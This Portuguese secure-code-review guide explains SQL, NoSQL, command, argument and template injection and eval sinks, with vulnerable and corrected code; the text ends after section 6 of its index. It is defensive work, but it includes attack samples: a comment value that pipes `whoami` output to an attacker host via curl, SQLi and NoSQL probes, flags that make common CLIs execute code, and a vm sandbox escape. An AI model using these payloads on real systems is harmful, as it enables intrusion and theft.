# Injeção

Toda a família de vulnerabilidades em que **dado controlado pelo atacante atravessa a fronteira e vira código, comando ou sintaxe** no interpretador de destino. Cobre SQL, NoSQL, comando de SO, argument injection, template (SSTI), expressão/`eval`, XXE e parsers de dados, desserialização, prototype pollution, LDAP, XPath, CSV, CRLF/header, log e ReDoS.

Abra este arquivo quando: houver concatenação de string com dado externo antes de uma chamada a banco, shell, parser, template ou desserializador; quando aparecer `raw`, `Unsafe`, `exec`, `eval`, `merge`, `load`, `deserialize` no diff; ou quando precisar decidir se um achado é injeção real.

**Não cobre XSS** — injeção no interpretador HTML/JS do navegador está em `references/xss-e-navegador.md`. Prompt injection e injeção em cadeias de LLM estão em `references/llm-e-ia.md`. Onde a exploração depende de acessar recursos internos pela rede, veja `references/ssrf-e-camada-http.md`.

No **OWASP Top 10:2025** (versão final publicada em janeiro de 2026), Injection é **A05:2025** — caiu de A03:2021, mas continua entre os cinco primeiros. XSS permanece consolidado dentro desta categoria desde 2021. SSRF foi absorvido por A01:2025 (Broken Access Control).

## Índice

- [1. A ideia central: canal de dados vs canal de controle](#1-a-ideia-central-canal-de-dados-vs-canal-de-controle)
- [2. SQL injection](#2-sql-injection)
- [3. NoSQL injection](#3-nosql-injection)
- [4. Command injection e argument injection](#4-command-injection-e-argument-injection)
- [5. Template injection (SSTI)](#5-template-injection-ssti)
- [6. Injeção de expressão e eval](#6-injeção-de-expressão-e-eval)
- [7. XXE e ataques a parsers de dados](#7-xxe-e-ataques-a-parsers-de-dados)
- [8. Desserialização insegura](#8-desserialização-insegura)
- [9. Prototype pollution](#9-prototype-pollution)
- [10. Outras injeções que aparecem em revisão](#10-outras-injeções-que-aparecem-em-revisão)
- [11. Sinais em revisão de código](#11-sinais-em-revisão-de-código)
- [12. Falsos positivos comuns](#12-falsos-positivos-comuns)
- [Fontes](#fontes)

---

## 1. A ideia central: canal de dados vs canal de controle

Todo interpretador recebe um fluxo único que mistura **instrução** e **operando**. `SELECT * FROM users WHERE id = 42` é uma string onde `SELECT ... WHERE id =` é controle e `42` é dado; o parser decide qual é qual pela gramática. Quando o operando é montado por concatenação com entrada externa, o atacante escreve na parte da string que o parser lê como gramática — e a fronteira entre dado e código, que só existia na cabeça do programador, some.

**A defesa correta é estrutural: o dado nunca entra no fluxo sintático.** Um prepared statement envia a query e os parâmetros em mensagens de protocolo distintas (no PostgreSQL, mensagens `Parse`/`Bind`/`Execute` do extended query protocol). O servidor compila o plano no `Parse`, quando o dado ainda não chegou. No `Bind`, o valor entra como um item tipado numa lista, não como texto a ser tokenizado. Não existe payload capaz de virar sintaxe porque não há passo de tokenização depois que o dado chega. O mesmo princípio vale para `execFile(bin, [args])` (o kernel recebe um `argv[]`, não uma linha de comando), para `sql.identifier()` num ORM, para JSON com schema em vez de formato serializado nativo.

**A defesa por sanitização de string é frágil por um motivo estrutural, não por descuido.** Sanitizar é reimplementar, no seu lado, um modelo do parser do outro lado. Esse modelo é sempre menor do que o parser real:

- O parser tem mais estados do que você enumerou. `mysql_real_escape_string` escapa `'` corretamente — e é inútil quando o valor está fora de aspas (`WHERE id = $input`), porque aí não há string para escapar.
- O parser tem modos que você não considerou. Em MySQL com charset `GBK`, `0xbf27` não era escapado e virava `'` válido após conversão (o clássico bypass de `addslashes`, ainda relevante em legado com `SET NAMES` mal feito).
- O dado passa por normalizações entre a sua sanitização e o parser: decode de URL, decode de Unicode, `NFKC`, decompressão, base64. Sanitizar antes de qualquer decode é sanitizar a string errada.
- Blocklist de metacaractere sempre esquece um. `;` e `|` são óbvios; `$(...)`, `` ` ``, `\n`, `${IFS}` e o próprio `-` inicial (argument injection) não são.

Regra prática de revisão: **se a correção proposta é uma função de escape/replace/regex sobre a entrada, ela provavelmente está errada.** A correção certa muda o mecanismo de entrega, não o conteúdo. Sanitização é aceitável só onde não existe canal separado (HTML é o exemplo — daí DOMPurify) ou como camada extra de defesa em profundidade.

**Corolário sobre validação.** Validar tipo e formato com Zod/Joi/`class-validator` na borda **não substitui** parametrização, mas mata classes inteiras de bug de graça: quem exige `z.string().uuid()` num `id` não tem SQLi naquele parâmetro nem operator injection no Mongo, porque um objeto ou uma string com aspas nunca chega ao sink. Use os dois.

CWEs desta família: [CWE-89](https://cwe.mitre.org/data/definitions/89.html) (SQL), [CWE-943](https://cwe.mitre.org/data/definitions/943.html) (NoSQL/query em geral), [CWE-78](https://cwe.mitre.org/data/definitions/78.html) (comando de SO), [CWE-88](https://cwe.mitre.org/data/definitions/88.html) (argument injection), [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html) (SSTI), [CWE-94](https://cwe.mitre.org/data/definitions/94.html) (code injection), [CWE-611](https://cwe.mitre.org/data/definitions/611.html) (XXE), [CWE-502](https://cwe.mitre.org/data/definitions/502.html) (desserialização), [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html) (prototype pollution), [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html) (ReDoS).

---

## 2. SQL injection

### 2.1 Tipos, por canal de retorno

O tipo importa porque determina como você **confirma** o achado num teste autorizado e o que o atacante consegue extrair.

| Tipo | Como o dado volta | Sinal típico |
|---|---|---|
| **In-band / error-based** | A mensagem de erro do banco vaza conteúdo | `ERROR: unterminated quoted string`, `ORA-01756`, `Conversion failed when converting the varchar value 'admin' to data type int` |
| **UNION-based** | O resultado da query injetada vem no próprio corpo da resposta | Precisa de mesmo número e tipos compatíveis de coluna; enumera-se com `ORDER BY n` até estourar |
| **Blind booleano** | Sem output, mas a resposta difere entre condição verdadeira e falsa | `' AND 1=1--` retorna 200 com conteúdo, `' AND 1=2--` retorna 200 vazio ou 404 |
| **Blind time-based** | Só o tempo de resposta difere | `pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`, `SLEEP(5)`, `dbms_pipe.receive_message(('a'),5)` |
| **Out-of-band (OAST)** | O banco faz uma conexão de rede para um host do testador | `xp_dirtree '\\host\x'` (MSSQL), `UTL_HTTP`/`XMLType` (Oracle), `LOAD_FILE('\\\\host\\x')` (MySQL em Windows) |

Blind time-based e OAST são os que sobrevivem em produção moderna, porque erro detalhado costuma estar suprimido. OAST é o único que funciona quando a injeção está num caminho totalmente assíncrono (uma fila, um job). Uma nota de teste: em blind time-based, meça a linha de base — rede lenta produz falso positivo, e `pg_sleep` dentro de um `WHERE` só executa se a linha for avaliada.

Referência de payloads por SGBD: [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 2.2 O que o prepared statement realmente faz

```ts
// ❌ vulnerável — o e-mail vira parte da gramática
const rows = await prisma.$queryRawUnsafe(
  `SELECT id, email FROM users WHERE email = '${email}'`
)

// ✅ correto — tagged template: Prisma emite SELECT ... WHERE email = $1 e envia
// o valor separado no Bind. O plano já está compilado quando o dado chega.
const rows = await prisma.$queryRaw<User[]>`
  SELECT id, email FROM users WHERE email = ${email}
`
```

Ponto essencial que muita gente erra: **não é o escape que protege, é a separação de mensagem no protocolo.** Um driver que "emula" prepared statements (`PDO::ATTR_EMULATE_PREPARES = true` no PHP, que já foi o default para MySQL, ou `client_side_prepared_statements` em alguns pools) faz a interpolação **no cliente** com escape. Isso reintroduz toda a fragilidade da sanitização, incluindo o bug de charset. Verifique: em PHP, `$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false)`; em `mysql2` (Node), `connection.execute()` usa prepared statement de verdade, `connection.query()` faz escape no cliente.

### 2.3 O que o prepared statement NÃO cobre

Placeholders substituem **valores**. Tudo que faz parte da estrutura da query fica de fora:

| Não parametrizável | Por quê | O que fazer |
|---|---|---|
| Nome de tabela/coluna | O planejador precisa resolver o identificador na fase de `Parse` | Allowlist explícita (mapa `chaveDoCliente → identificador literal`) |
| `ORDER BY <col>` e `ASC/DESC` | Idem — faz parte do plano | Allowlist; `ORDER BY $1` em Postgres compila mas ordena por uma **constante**, silenciosamente sem efeito |
| `LIMIT`/`OFFSET` em drivers antigos | Alguns emitiam o valor como string literal e o parser recusava | Converta para inteiro no código (`Number.isSafeInteger`) e faça clamp |
| `LIKE '%' || $1 || '%'` | O placeholder está certo, mas `%` e `_` **dentro do valor** são wildcards | `ESCAPE '\'` + escapar `%`, `_`, `\` no valor. Sem isso não há SQLi, mas há DoS (`%%%%%%a`) e vazamento por sondagem |
| Cláusula `IN (...)` dinâmica | Um placeholder por elemento; muita gente faz `IN (${ids.join(',')})` | Gere `$1,$2,...$n`; em Prisma use `Prisma.join(ids)`; em Go use `sqlx.In` |
| `SET`/`SHOW`/DDL | Não aceitam parâmetro | Allowlist ou não exponha |
| Trecho JSON path (`->>'campo'`) | O path é literal na sintaxe | Allowlist de campos |

```ts
// ❌ o valor é parametrizado, o wildcard não — DoS e sondagem
const q = await prisma.$queryRaw`SELECT * FROM p WHERE name LIKE ${'%' + term + '%'}`

// ✅ escapa os metacaracteres do LIKE e declara o escape
const safe = term.replace(/[\\%_]/g, (c) => '\\' + c)
const q = await prisma.$queryRaw`
  SELECT * FROM p WHERE name LIKE ${'%' + safe + '%'} ESCAPE '\\'
`
```

### 2.4 Allowlist para identificadores — a forma correta

Não valide com regex (`/^[a-z_]+$/`) e concatene: um identificador que passa no regex ainda pode ser uma coluna que não deveria ser exposta (`password_hash`, `internal_notes`). **Mapeie**, não valide:

```ts
// ✅ o valor vindo do cliente nunca chega ao SQL; só a chave é comparada
const SORTABLE = {
  createdAt: 'created_at',
  name:      'name',
  price:     'price',
} as const

const col = SORTABLE[req.query.sort as keyof typeof SORTABLE] ?? 'created_at'
const dir = req.query.dir === 'desc' ? 'DESC' : 'ASC'
const rows = await prisma.$queryRawUnsafe(
  `SELECT id, name FROM products ORDER BY ${col} ${dir} LIMIT $1`, limit
)
```

Isso também blinda contra o bug do Drizzle descrito abaixo: com mapa, o valor externo não alcança nem mesmo a função de quoting de identificador.

### 2.5 ORMs: os nomes exatos dos escape hatches

Em revisão, é isso que se procura. Nenhum destes é bug por si só — todos são bug **quando recebem string montada com entrada externa**.

| ORM/Query builder | Seguro | Perigoso — grep por isto |
|---|---|---|
| **Prisma** | `$queryRaw` / `$executeRaw` (tagged template), `Prisma.sql`, `Prisma.join`, `Prisma.empty` | `$queryRawUnsafe`, `$executeRawUnsafe`, `Prisma.raw(` — inclusive interpolado dentro de um tagged template seguro, o que anula a proteção |
| **TypeORM** | `.where('x = :v', { v })`, `createQueryBuilder` com parâmetros nomeados | `.query(`, `Raw(` (find operator), `.orderBy(userInput)`, `.where('x = ' + v)`, `.andWhere(\`...${v}\`)` |
| **Sequelize** | `sequelize.query(sql, { replacements })` e `{ bind }` | `Sequelize.literal(`, `sequelize.fn` com literal, `sequelize.query('...' + v)`, `where: literal(...)`, `order: literal(...)` |
| **Knex** | `.where('c', v)`, `knex.raw('?? = ?', [col, val])` — `??` faz binding de identificador | `knex.raw(` sem bindings, `whereRaw(`, `orderByRaw(`, `havingRaw(`, `joinRaw(`, `.orderBy(userInput)` (identificador não é escapado no mesmo grau de um valor) |
| **Drizzle** | `` sql`...${v}` `` (bind automático), `eq()`/`and()` | `sql.raw(` (sem nenhuma proteção, por design documentado), `sql.identifier(` e `.as(` com input externo |
| **GORM (Go)** | `db.Where("id = ?", id)` | `db.Raw(`, `db.Exec(` com `fmt.Sprintf`, `.Order(userInput)`, `.Group(`, `.Select(` com string montada, `clause.Expr` |
| **sqlx / database/sql (Go)** | `db.Query("... $1", v)`, `sqlx.In` para `IN` | `fmt.Sprintf` em qualquer lugar antes de `Query`/`Exec`; `db.Rebind` não sanitiza nada |
| **Mongoose/MongoDB** | veja §3 | `$where`, `$expr` com string, `.find(req.body)` |

**Nota concreta e recente:** [CVE-2026-39356](https://github.com/drizzle-team/drizzle-orm/security/advisories/GHSA-gpj5-g38j-94v9) (CVSS 7.5, High) — o `escapeName()` do Drizzle não duplicava o delimitador dentro do identificador, então `sql.identifier(input)` e `.as(input)` permitiam terminar o identificador citado e injetar SQL. Corrigido em **0.45.2** e **1.0.0-beta.20**, doblando `"` (Postgres/SQLite/Gel) e `` ` `` (MySQL/SingleStore). O padrão vulnerável era exatamente `orderBy(sql.identifier(req.query.sort))` — ordenação dinâmica, construtor de relatório, alias de CTE vindo de parâmetro. Se você depende de quoting de identificador de qualquer biblioteca para segurança, está uma versão de distância de um bug; prefira o mapa de allowlist.

O erro mais comum com Prisma na prática:

```ts
// ❌ o tagged template é seguro, mas Prisma.raw reabre o buraco
const rows = await prisma.$queryRaw`SELECT * FROM ${Prisma.raw(table)} WHERE id = ${id}`

// ✅ identificador por allowlist, valor por bind
const table = TABLES[key] // mapa fixo
const rows = await prisma.$queryRawUnsafe(`SELECT * FROM ${table} WHERE id = $1`, id)
```

### 2.6 Injeção de segunda ordem

O dado é **armazenado com segurança** (via prepared statement, sem executar nada) e depois lido do banco e **concatenado** numa segunda query, num job noturno, num relatório ou numa migração. O revisor olha o endpoint de escrita, vê o parâmetro correto e aprova; o sink está em outro arquivo.

Sinal de revisão: qualquer query montada por concatenação onde a variável **veio de um `SELECT`**. A origem "vem do banco, é confiável" é falsa por definição — o banco guarda o que o usuário escreveu. Trate coluna de texto controlada por usuário (nome, bio, tag, nome de arquivo) com o mesmo cuidado de `req.body`.

Casos reais: nome de usuário salvo com `'` e depois usado num `CREATE ROLE` ou num `INSERT INTO audit(...) VALUES ('${user.name}')`; slug persistido usado como nome de coluna em um pivot dinâmico.

### 2.7 Stored procedures não protegem por si

Uma stored procedure é só código SQL do outro lado. Se dentro dela houver `EXEC('SELECT ... ' + @param)` (T-SQL), `EXECUTE IMMEDIATE` (Oracle/PL-SQL) ou `EXECUTE format(...)` sem `%L`/`%I` (PL/pgSQL), a injeção continua — agora rodando com os privilégios do dono da procedure, o que frequentemente **piora** o impacto. Em PL/pgSQL, `format('... %L', v)` faz quoting de literal e `%I` de identificador; `%s` é concatenação crua. Revise o corpo da procedure, não só a chamada.

### 2.8 Defesa em profundidade

- **Usuário do banco com privilégio mínimo**: a conta da aplicação não deve ser owner do schema nem ter `CREATE`, `DROP`, `COPY ... FROM PROGRAM` (Postgres — leva a RCE direto), `FILE` (MySQL, habilita `LOAD_FILE`/`INTO OUTFILE`), nem `xp_cmdshell` (MSSQL, desabilitado por padrão desde SQL Server 2005 — confirme que continua). Uma conta separada só-leitura para relatórios reduz uma SQLi de "RCE" para "leitura". Gestão de credenciais em `references/criptografia-e-segredos.md`.
- **Desligue mensagem de erro detalhada em produção** — mata error-based e reduz muito a velocidade do blind.
- **Row-level security** (Postgres RLS) limita o que uma injeção alcança mesmo com `UNION`.
- **Limite de linhas e timeout de statement** (`statement_timeout` no Postgres) encarece blind time-based e exfiltração em massa.
- **WAF é atenuante, não correção.** Anote como tal no relatório.

---

## 3. NoSQL injection

### 3.1 A raiz do bug: JSON entrega objeto onde o código esperava string

Este é o ponto que explica quase toda NoSQL injection em Node:

```ts
// login: o dev assume que email e password são strings
const user = await User.findOne({ email: req.body.email, password: req.body.password })
```

Com `Content-Type: application/json` e corpo `{"email":"admin@x.com","password":{"$ne":null}}`, o parser JSON produz um **objeto** onde o código esperava string. O driver do MongoDB monta o filtro `{ password: { $ne: null } }` — que é um filtro sintaticamente perfeito e semanticamente "qualquer senha diferente de null". Autenticação furada sem nenhum caractere especial, sem escape, sem aspas. O mesmo vale com `Content-Type: application/x-www-form-urlencoded` e `password[$ne]=` (o `qs` do Express cria o objeto aninhado a partir dos colchetes).

A defesa não é escapar `$` — é **garantir que o valor é uma string antes de chegar na query**.

```ts
// ✅ o schema recusa objeto; nada além de string alcança o driver
const LoginBody = z.object({
  email: z.string().email().max(254),
  password: z.string().min(8).max(200),
})
const { email, password } = LoginBody.parse(req.body)
const user = await User.findOne({ email })   // e compare o hash em código, veja autenticacao-e-sessao.md
```

### 3.2 Operator injection: o repertório

| Operador | Uso ofensivo | Observação |
|---|---|---|
| `$ne`, `$gt`, `$gte`, `$lt` | Bypass de comparação e de autenticação | `{"$gt":""}` casa com qualquer string |
| `$in`, `$nin` | Bypass e enumeração | |
| `$regex` | **Extração caractere a caractere** de campo não retornado (`{"$regex":"^a"}`, `^ab`, ...) e **DoS** (regex catastrófica avaliada no servidor) | O vetor blind mais produtivo em Mongo; funciona contra hash de senha, token, `resetToken` |
| `$where` | Executa **JavaScript no servidor** — RCE contra o processo do banco em deployments que não desabilitaram | Requer `javascriptEnabled`; desligue com `--noscripting`/`security.javascriptEnabled: false` |
| `$expr`, `$function`, `$accumulator` | Avaliação de expressão/JS em aggregation | `$function`/`$accumulator` também dependem de scripting habilitado |
| `$nor`, `$or`, `$and` | Envolvem arrays — usados para **contornar sanitizadores** | Veja abaixo |

**Fato concreto e recente:** [CVE-2026-42334](https://github.com/Automattic/mongoose/security/advisories/GHSA-wpg9-53fq-2r8h) (CVSS 7.5) — o `sanitizeFilter` do Mongoose envolve valores em `$eq`, mas **não recursava em `$nor`**. Como `$nor` recebe um array, e array não dispara o `hasDollarKeys()`, dava para embutir `$ne`/`$gt`/`$regex` dentro de um `$nor` e passar batido. Corrigido em **6.13.9, 7.8.9, 8.22.1 e 9.1.6**. Lição de revisão: `sanitizeFilter` é rede de proteção, não a defesa primária — a defesa primária é validar tipo com schema. O próprio advisory diz que aplicações que validam schema ou não passam `req.body` cru para a query **não são afetadas**.

Sobre `$where`: versões do Mongoose anteriores a **8.9.5 / 7.8.4 / 6.13.6** tinham uso impróprio do operador permitindo execução de JS arbitrário na query.

### 3.3 Correções, em ordem de valor

1. **Validação de tipo na borda** (Zod/Joi/TypeBox/Valibot). Resolve 95% dos casos e não depende de o driver acertar.
2. **`sanitizeFilter: true`** no Mongoose (global via `mongoose.set('sanitizeFilter', true)` ou por query). Envolve valores do usuário em `$eq`. Camada extra.
3. **Desabilitar server-side JS no mongod**: `security.javascriptEnabled: false` no `mongod.conf` (ou `--noscripting`). Elimina `$where`, `$function`, `$accumulator` e `mapReduce` de uma vez.
4. **Nunca `Model.find(req.query)` / `Model.find(req.body)`.** Construa o filtro campo a campo a partir de valores já validados.
5. **`express-mongo-sanitize` está quebrado no Express 5** — `req.query` virou getter lazy e não é mais mutável, então o middleware falha silenciosamente ou lança. Não substitua por um clone dele: sanitize no ponto de construção da query, com tipos.

### 3.4 Além do MongoDB

- **Redis**: não tem query language, mas tem **command injection via CRLF** se você montar comandos no protocolo RESP com dado cru, e tem o padrão perigoso de `EVAL` com script montado por concatenação — Lua injection. Chave montada com input do usuário (`user:${id}:session`) permite colisão de namespace se `id` puder conter `:`. Veja também `references/ssrf-e-camada-http.md` (SSRF para Redis via CRLF em URL é vetor clássico de RCE).
- **Elasticsearch/OpenSearch**: passar `req.body` direto como `query` do DSL permite o atacante trocar o `query.bool.filter` e ler índices/documentos que a UI não expõe; `query_string` aceita sintaxe Lucene com wildcards e campos arbitrários (`_index:*`), o que vaza estrutura e permite DoS (`*:*` com `size` grande, ou regex Lucene). Aceite só um conjunto fixo de campos e monte o DSL você mesmo; desative `allow_expensive_queries` quando possível. Injeção em `script` (Painless) é code injection.
- **Aggregation pipeline**: passar estágio vindo do cliente (`$lookup` para outra coleção, `$out`/`$merge` que **escrevem** numa coleção) é tão grave quanto `$where`. Nunca aceite estágio de pipeline do cliente; aceite parâmetros e monte o pipeline.
- **CouchDB, Firestore, DynamoDB**: `PartiQL` no DynamoDB é SQL de verdade e injetável — use `ExecuteStatement` com `Parameters`, não interpolação.

---

## 4. Command injection e argument injection

### 4.1 Command injection clássica

O bug é sempre o mesmo: uma string vira linha de comando processada por um **shell**, e o shell tem metacaracteres.

| Runtime | Passa por shell | Não passa por shell |
|---|---|---|
| Node | `child_process.exec`, `execSync`, `spawn(..., {shell:true})`, `execFile(..., {shell:true})` | `execFile`, `spawn`, `execFileSync` (default `shell: false`) |
| Python | `subprocess.*(..., shell=True)`, `os.system`, `os.popen`, `commands.*` | `subprocess.run([...])` com lista |
| Go | `exec.Command("sh", "-c", cmd)`, `exec.Command("bash", "-c", ...)` | `exec.Command(bin, arg1, arg2)` — Go **não** usa shell por padrão |
| Java | `Runtime.getRuntime().exec(String)` (tokenização ingênua, sem shell mas com armadilhas), `ProcessBuilder("sh","-c",...)` | `ProcessBuilder(List<String>)` |
| PHP | `system`, `exec`, `shell_exec`, `passthru`, backticks, `popen`, `proc_open` com string | `proc_open` com array (PHP ≥ 7.4) |
| Ruby | `system("str")`, `` `str` ``, `%x{}`, `open("|cmd")` | `system(bin, *args)` |

Metacaracteres que importam em `/bin/sh`: `; & | ` $ ( ) < > \n \r " ' \ * ? [ ] { } ~ !` e `${IFS}` como substituto de espaço. Blocklist não é defesa.

```ts
// ❌ exec passa por /bin/sh -c
import { exec } from 'node:child_process'
exec(`convert ${file} -resize 100x100 out.png`)   // file = "x.png; curl attacker/$(whoami)"

// ✅ execFile: argv[] vai direto ao execve, sem shell nenhum
import { execFile } from 'node:child_process'
await execFileAsync('convert', ['--', file, '-resize', '100x100', 'out.png'])
```

Cuidado com dois casos fáceis de errar:
- **`{ shell: true }` reintroduz o shell** mesmo em `spawn`/`execFile`. É um `grep` obrigatório.
- **Windows não tem separação limpa.** Em Windows o `CreateProcess` recebe uma **linha de comando única**; a biblioteca é que faz o quoting. Argumentos com `"` e `\` já produziram bugs de escape em Node, Rust e Go. Em Windows, `spawn` com `.bat`/`.cmd` sempre passa por `cmd.exe` — foi exatamente a raiz do [CVE-2024-24576](https://nvd.nist.gov/vuln/detail/CVE-2024-24576) ("BatBadBut", Rust `std::process`, CVSS 10.0) e de correções paralelas em Node, Erlang, Python e Go.

### 4.2 Argument injection — o subestimado

O binário é fixo, não há shell, e mesmo assim há RCE. Motivo: o atacante controla um **argumento**, e argumentos que começam com `-` viram **flags**. [CWE-88](https://cwe.mitre.org/data/definitions/88.html).

```ts
// ❌ sem shell, mas o "filename" pode ser uma flag
await execFileAsync('curl', ['-s', userUrl, '-o', dest])
// userUrl = "-K/tmp/uploaded.conf" → curl lê um arquivo de config com opções arbitrárias
```

Flags que transformam utilitários comuns em primitiva de execução ou de escrita/leitura arbitrária:

| Binário | Flag | Efeito |
|---|---|---|
| `curl` | `-o`/`--output`, `-K`/`--config`, `--upload-file`, `-T` | Escrita arbitrária de arquivo; `-K` lê um arquivo de config com **qualquer** outra opção |
| `ssh`/`scp` | `-o ProxyCommand=...`, `-F <config>`, `-E` | Execução de comando ([CVE-2023-51385](https://threatprotect.qualys.com/2023/12/26/ssh-proxycommand-unexpected-code-execution-vulnerability-cve-2023-51385/) usa metacaractere em hostname com `ProxyCommand` expandindo `%h`) |
| `git` | `--upload-pack=`, `-c core.sshCommand=`, `-c protocol.ext.allow=always`, `--exec=` | Execução via clone/fetch de repositório controlado |
| `tar` | `--checkpoint=1 --checkpoint-action=exec=...`, `-I`/`--use-compress-program` | Execução |
| `find` | `-exec ... ;`, `-fprintf` | Execução, escrita |
| `wget` | `--use-askpass=`, `-O`, `--post-file` | Execução, escrita, exfiltração |
| `rsync` | `-e`/`--rsh=`, `--rsync-path=` | Execução no lado remoto |
| `zip`/`7z` | `--unzip-command=`, `-i@arquivo` | Execução, leitura |
| `psql`/`mysql` | `-c`, `--command`, `-e` | SQL arbitrário |
| `ffmpeg` | `-i concat:` / protocolos como `file:`, `subfile:` | Leitura arbitrária de arquivo |

Isso não é teórico: [CVE-2026-4631](https://www.openwall.com/lists/oss-security/2026/04/10/5) no Cockpit foi RCE **não autenticada** por argument injection na linha de comando do SSH.

**Defesas, em ordem:**

1. **`--` (end-of-options)** antes dos operandos. É a correção mais barata porque não exige validar nada, só posicionar: `execFile('grep', ['-n', pattern, '--', file])`. Funciona na maioria dos utilitários GNU/BSD; **não** em todos (`ssh` e alguns Java tools não respeitam), então confirme por binário.
2. **Prefixar caminho**: transformar `file` em `./file` ou resolver para caminho absoluto tira a ambiguidade com flag e ainda ajuda contra path traversal.
3. **Allowlist de formato** antes da chamada: URL parseada e re-serializada com allowlist de esquema; nome de arquivo contra `/^[A-Za-z0-9._-]{1,100}$/` com rejeição explícita de `-` inicial e de `..`; hostname resolvido para IP literal.
4. **Não usar o CLI.** `curl` vira `fetch` com `URL` parseado; `git` vira `isomorphic-git`/libgit2; `convert` vira `sharp`. Elimina a classe inteira.
5. **Isolamento**: rodar o subprocesso com usuário sem privilégio, `seccomp`, container sem rede de saída. Reduz o impacto quando a correção não é imediata.

---

## 5. Template injection (SSTI)

### 5.1 A raiz: template **compilado a partir de** input, não input **passado ao** template

```js
// ❌ SSTI — o input do usuário é o código-fonte do template
app.get('/hi', (req, res) => res.send(ejs.render(`<p>Olá ${req.query.name}</p>`)))

// ✅ o template é literal fixo; o input é dado passado ao renderizador
app.get('/hi', (req, res) => res.send(ejs.render('<p>Olá <%= name %></p>', { name: req.query.name })))
```

O mesmo erro aparece disfarçado quando o template vem do banco (e-mail transacional editável, "template de fatura" configurável pelo tenant, mensagem de notificação customizável). Isso é o padrão de maior severidade real, porque o recurso "usuário edita o template" é *pedido de produto* — e virou RCE em várias plataformas de marketing e ticketing.

### 5.2 Detecção

Envie a expressão aritmética e veja se ela é **avaliada** (resposta contém `49`) em vez de ecoada:

| Motor | Sonda | Linguagem |
|---|---|---|
| Jinja2, Twig, Nunjucks, Liquid, Handlebars (`{{ }}`) | `{{7*7}}` | Python/PHP/JS |
| Freemarker, Velocity, Thymeleaf, JSP EL, SpEL | `${7*7}` | Java |
| ERB, EJS | `<%= 7*7 %>` | Ruby/JS |
| Thymeleaf preprocessing, Pug interpolation | `#{7*7}` | Java/JS |
| Smarty | `{7*7}` | PHP |

Diferenciação: `{{7*'7'}}` retorna `7777777` em Jinja2 e `49` em Twig. Se `{{7*7}}` não avalia mas `${7*7}` sim, você está do lado Java. Sondas devem ser mandadas em campo cujo eco você já confirmou (nome, assunto de e-mail, campo de perfil).

Faltando isso, procure a **string de erro**: um template quebrado costuma vazar o nome do motor no stack trace (`jinja2.exceptions.TemplateSyntaxError`, `freemarker.core.ParseException`).

Guia completo: [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection).

### 5.3 Por que SSTI escala para RCE (mecanismo, Jinja2)

Jinja2 roda em sandbox parcial, mas o modelo de objetos do Python é totalmente introspectável a partir de **qualquer** valor. De uma string vazia chega-se à classe (`__class__`), da classe à cadeia de herança (`__mro__`), do `object` à lista de **todas as subclasses carregadas no processo** (`__subclasses__()`). Nessa lista costuma haver algo cujo `__init__.__globals__` dá acesso a `os`, `subprocess` ou `builtins` — e daí a execução é direta. O `SandboxedEnvironment` do Jinja bloqueia atributos que começam com `_`, mas historicamente foi contornado por caminhos alternativos (`|attr()`, `request.application`, `get_flashed_messages.__globals__`, `lipsum`, `cycler`, `namespace`), e cada bypass gerou uma correção pontual.

A conclusão prática: **sandbox de template não é fronteira de segurança confiável.** Nunca compile template a partir de input. Se o produto exige templates editáveis, use uma linguagem **sem** acesso a atributos e sem chamada de função arbitrária — Mustache logic-less, ou Liquid com `strict_variables`/filtros allowlisted, ou um motor rodando fora do processo, em sandbox de verdade (worker isolado, WASM, container efêmero).

Equivalentes por motor: Freemarker chega a `freemarker.template.utility.Execute` (bloqueável com `TemplateClassResolver.SAFER_RESOLVER` ou `new_builtin_class_resolver`); Velocity, a `ClassTool`/`$class`; Handlebars ganhou RCE por manipulação de `Object.prototype` durante a compilação; EJS teve [CVE-2022-29078](https://nvd.nist.gov/vuln/detail/CVE-2022-29078), em que a opção `outputFunctionName` (alcançável **via prototype pollution**) era interpolada no corpo da função compilada — o exemplo perfeito de duas classes desta página se combinando.

### 5.4 Client-side template injection

Mesmo bug do lado do navegador: framework com interpolação (`v-html` no Vue, AngularJS 1.x com `$compile`/`ng-bind-html`, `{{}}` em template compilado no cliente) recebendo string do servidor que contém a sintaxe do framework. Em AngularJS 1.x isso era caminho conhecido para XSS mesmo com CSP restritiva, porque o "script" é interpretado pelo próprio framework e não pelo parser de `<script>`. Detalhes e defesa em `references/xss-e-navegador.md`.

---

## 6. Injeção de expressão e eval

| Sink | Runtime | Nota |
|---|---|---|
| `eval(str)` | JS | Herda escopo léxico; o pior caso |
| `new Function(str)` | JS | Escopo global apenas, mas ainda execução arbitrária |
| `setTimeout('code', n)` / `setInterval` com **string** | JS | Vira `eval` implícito. Com função, é seguro |
| `node:vm` (`vm.runInNewContext`, `vm.Script`) | Node | **Não é sandbox de segurança** — a doc do Node diz explicitamente. `this.constructor.constructor('return process')()` escapa. Use `isolated-vm` (V8 isolate real) ou processo separado |
| `vm2` | Node | **Descontinuado**; teve escapes de sandbox críticos (CVE-2023-37466, CVE-2023-37903). Nunca introduzir |
| `JSON.parse(str, reviver)` | JS | `JSON.parse` em si é seguro; o **reviver** costuma ser onde alguém faz merge cru → prototype pollution (§9) |
| `require(userInput)` / `import(userInput)` | Node | Carrega módulo arbitrário; combinado com upload vira RCE |
| `exec()`/`eval()`/`compile()` | Python | Idem; `literal_eval` é a alternativa segura para dados |
| **EL injection** | Java | `javax.el`/`jakarta.el` avaliando `${...}` de input — comum em mensagens de validação do Bean Validation (`ConstraintViolation` com template interpolado) |
| **OGNL** | Java/Struts | `${...}`/`%{...}`. [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638) (S2-045: OGNL no header `Content-Type` de requisição multipart) foi o vetor do breach da Equifax, ~145M de registros. Depois: CVE-2018-11776 (S2-057, `namespace`), CVE-2023-50164 e [CVE-2024-53677](https://www.dynatrace.com/news/blog/the-anatomy-of-broken-apache-struts-2-a-technical-deep-dive-into-cve-2024-53677/) (manipulação de parâmetro de upload → RCE, afeta 2.0.0–6.3.0.2 incluindo o EOL 2.5.33). Novas CVEs continuaram surgindo em 2025 exigindo 6.8.0/7.1.1. Struts 2 está em EOL — trate qualquer uso como risco de arquitetura |
